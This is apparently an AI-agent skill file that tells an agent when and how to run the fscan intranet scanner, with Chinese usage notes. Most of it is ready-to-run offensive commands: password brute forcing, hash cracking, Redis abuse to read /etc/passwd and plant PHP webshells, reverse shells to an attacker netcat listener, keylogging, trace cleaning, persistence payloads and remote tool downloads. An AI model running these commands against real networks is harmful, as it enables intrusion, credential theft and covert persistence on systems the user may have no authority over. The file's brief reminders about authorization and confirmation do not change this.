---
name: fscan
description: >
  内网综合扫描工具 fscan v2.2.0。集存活探测、端口扫描、服务识别、漏洞POC验证、
  弱口令爆破、Redis利用、Socks5代理、Web指纹识别于一体的内网安全评估工具。
  当用户要求内网扫描、存活探测、端口扫描、漏洞扫描、弱口令爆破、C段扫描、 Redis未授权访问利用、内网代理搭建时触发此 skill。
agent_created: true
---

# fscan -- 内网综合扫描工具

## 工具位置

```
C:\HACK\1漏洞扫描工具\fscan\fscan.exe
```

版本: v2.2.0 (bf036fd 2026-07-10T05:57:56Z)

## 执行方式

```powershell
& "C:\HACK\1漏洞扫描工具\fscan\fscan.exe" [options]
```

## 核心使用原则

1. **默认 Ping + TCP 双探测**: 提高存活准确率，无需额外参数。
2. **默认输出 result.txt**: 结果保存在当前工作目录，`-o` 自定义文件名。
3. **`-nobr` 谨慎使用**: 仅需端口/POC 时使用，常规扫描保留爆破。
4. **`-nopoc` 加速扫描**: 纯端口/服务扫描时关闭，大幅提速。
5. **大网段限速**: `/16` 或更大网段加 `-rate` 避免网络拥塞。
6. **高风险模块需确认**: `-rsh`、`-persistence-file`、`-sc` 具有侵入性，执行前须确认。

## 常用场景

### 1. 基础内网扫描

```powershell
# C段完整扫描 (存活+端口+服务+POC+爆破)
fscan.exe -h 192.168.1.0/24

# 指定端口 / 全端口
fscan.exe -h 192.168.1.0/24 -p 80,443,8080-8090
fscan.exe -h 192.168.1.0/24 -p 1-65535

# 纯存活探测
fscan.exe -h 192.168.1.0/24 -m icmp          # 仅ICMP
fscan.exe -h 192.168.1.0/24 -ao               # 更快，不做TCP补充

# 纯端口/服务扫描 (跳过POC和爆破)
fscan.exe -h 192.168.1.0/24 -nopoc -nobr -noredis

# 从文件读取目标 / 排除
fscan.exe -hf hosts.txt                        # 主机列表 (每行一个IP/CIDR)
fscan.exe -h 192.168.1.0/24 -eh 192.168.1.1    # 排除指定主机
fscan.exe -h 192.168.1.0/24 -ehf exclude.txt   # 排除主机文件
fscan.exe -h 192.168.1.0/24 -ep 22,3389        # 排除端口
fscan.exe -h 192.168.1.0/24 -pf ports.txt     # 从文件读取端口列表

# 网段预筛 (大规模扫描优化, 默认开启)
fscan.exe -h 10.0.0.0/8 -nsp                  # 禁用网段预筛 (跳过空/24网段优化)

# 域名扫描
fscan.exe -h example.com
fscan.exe -domain example.com
```

### 2. POC 漏洞扫描

```powershell
# 全量POC
fscan.exe -h 192.168.1.0/24 -nobr -noredis -full

# 指定单个POC
fscan.exe -h 192.168.1.0/24 -nobr -pocname thinkphp_rce

# 自定义POC目录
fscan.exe -h 192.168.1.0/24 -nobr -pocpath C:\my_pocs
```

### 3. 弱口令爆破

```powershell
# 指定用户名/密码
fscan.exe -h 192.168.1.0/24 -nopoc -user admin -pwd admin123

# 字典爆破
fscan.exe -h 192.168.1.0/24 -nopoc -userf users.txt -pwdf pass.txt

# 多用户+多密码组合
fscan.exe -h 192.168.1.0/24 -nopoc -user admin -usera root -pwd 123456 -pwda admin

# 用户名:密码对文件
fscan.exe -h 192.168.1.0/24 -nopoc -upf userpass.txt

# Hash碰撞
fscan.exe -h 192.168.1.0/24 -hash <32位或16位Hash>
fscan.exe -h 192.168.1.0/24 -hashf hashes.txt

# SSH私钥认证
fscan.exe -h 192.168.1.0/24 -sshkey C:\keys\id_rsa -user root
```

### 4. Web 扫描

```powershell
# 单URL / 批量URL
fscan.exe -u http://192.168.1.100:8080
fscan.exe -uf urls.txt

# 带Cookie / 代理
fscan.exe -u http://192.168.1.100/admin -cookie "JSESSIONID=xxx"
fscan.exe -u http://10.0.0.100 -socks5 127.0.0.1:1080
fscan.exe -u http://10.0.0.100 -proxy http://127.0.0.1:8080

# 自定义User-Agent
fscan.exe -u http://192.168.1.100 -ua "Mozilla/5.0 Custom"
```

### 5. Redis 未授权利用

```powershell
# 读取文件 / 写Webshell
fscan.exe -h 192.168.1.0/24 -rf /etc/passwd
fscan.exe -h 192.168.1.0/24 -rwf shell.php -rwp /var/www/html/

# 写入自定义内容 / 交互式Shell
fscan.exe -h 192.168.1.0/24 -rwc "<?php phpinfo();?>" -rwp /var/www/html/info.php
fscan.exe -h 192.168.1.0/24 -rs shell

# 禁用Redis利用 (加速扫描)
fscan.exe -h 192.168.1.0/24 -noredis
```

### 6. 代理与Shell

```powershell
# 启动SOCKS5代理 / 通过代理扫描内网
fscan.exe -h 192.168.1.0/24 -start-socks5 1080
fscan.exe -h 10.0.0.0/24 -socks5 127.0.0.1:1080

# 反弹Shell (攻击机先开监听: nc -lvnp 4444)
fscan.exe -h 192.168.1.0/24 -rsh 192.168.1.200:4444

# 正向Shell
fscan.exe -h 192.168.1.0/24 -fsh-port 4444
```

### 7. 输出与格式

```powershell
fscan.exe -h 192.168.1.0/24 -o scan_result.txt         # 自定义输出文件
fscan.exe -h 192.168.1.0/24 -f json -o result.json      # JSON格式
fscan.exe -h 192.168.1.0/24 -silent                     # 静默模式
fscan.exe -h 192.168.1.0/24 -debug                      # 调试模式
fscan.exe -h 192.168.1.0/24 -perf                       # 性能统计JSON
fscan.exe -h 192.168.1.0/24 -lang en                    # 英文 (默认zh)
fscan.exe -h 192.168.1.0/24 -no                         # 禁用结果保存
fscan.exe -h 192.168.1.0/24 -nocolor                    # 禁用颜色
fscan.exe -h 192.168.1.0/24 -nopg                       # 禁用进度条
fscan.exe -h 192.168.1.0/24 -log base,info,success       # 日志级别控制
```

### 8. 性能调优

```powershell
fscan.exe -h 192.168.1.0/24 -t 1000        # 端口线程 (默认600)
fscan.exe -h 192.168.1.0/24 -mt 30         # 模块线程 (默认20)
fscan.exe -h 192.168.1.0/24 -num 50        # POC并发 (默认20)
fscan.exe -h 192.168.1.0/24 -time 2        # 端口超时秒 (默认3)
fscan.exe -h 192.168.1.0/24 -gt 300        # 全局超时秒 (默认180)
fscan.exe -h 192.168.1.0/24 -wt 3          # Web超时秒 (默认5)
fscan.exe -h 192.168.1.0/24 -rate 5000     # 限速(包/分钟)
fscan.exe -h 192.168.1.0/24 -maxpkts 100000 # 最大发包总数
fscan.exe -h 192.168.1.0/24 -retry 5       # 重试次数 (默认3)
fscan.exe -h 192.168.1.0/24 -max-redirect 5 # HTTP最大重定向 (默认10)
fscan.exe -h 10.0.0.0/8 -icmp-rate 0.5     # ICMP发包速率 (默认0.1,约1463pps)
```

### 9. 高级功能

```powershell
# 本地插件 (需目标已有 agent/shell 权限)
fscan.exe -h 192.168.1.0/24 -local avdetect                      # 杀软检测
fscan.exe -h 192.168.1.0/24 -local keylogger -keylog-output k.txt # 键盘记录
fscan.exe -h 192.168.1.0/24 -local cleaner                       # 痕迹清理

# 持久化
fscan.exe -h 192.168.1.0/24 -persistence-file /path/to/payload.elf  # Linux
fscan.exe -h 192.168.1.0/24 -win-pe C:\payload.exe                  # Windows

# 文件下载
fscan.exe -h 192.168.1.0/24 -download-url http://remote.com/tool.exe
fscan.exe -h 192.168.1.0/24 -download-url http://remote.com/tool.exe -download-path C:\temp\

# VPN/多网卡
fscan.exe -h 10.0.0.0/24 -iface 10.8.0.5

# DNS日志
fscan.exe -h 192.168.1.0/24 -dns
```

## 默认端口

fscan 默认扫描 1000 个常用端口: 21(FTP)、22(SSH)、80~443(Web)、445(SMB)、1433(MSSQL)、1521(Oracle)、3306(MySQL)、3389(RDP)、5432(PostgreSQL)、6379(Redis)、27017(MongoDB)、8080~9090(Web/Middleware)、11211(Memcached)、50070(Hadoop) 等。完整列表可用 `--help` 查看。

## 注意事项

- ICMP + TCP 双探测默认开启，确保存活准确率。
- 大网段 (`/8`, `/16`) 先用 `-m icmp` 或 `-np -ntp` 缩小范围。默认开启网段预筛(跳过空/24段)，加 `-nsp` 可禁用。
- 内网扫描流量大，必要时加 `-rate` 限速。
- 弱口令爆破和 POC 扫描具有攻击流量特征，确保有授权。
- 输出文件 UTF-8 编码，Windows 记事本需手动选编码。
- `-local` 插件需目标已植入 agent 或已有 shell 权限。
- 反弹Shell (`-rsh`) 需攻击机先开启监听: `nc -lvnp 4444`。
- `--help` 可查看 `-p` 默认的完整 1000 端口列表及当前编译版本信息。
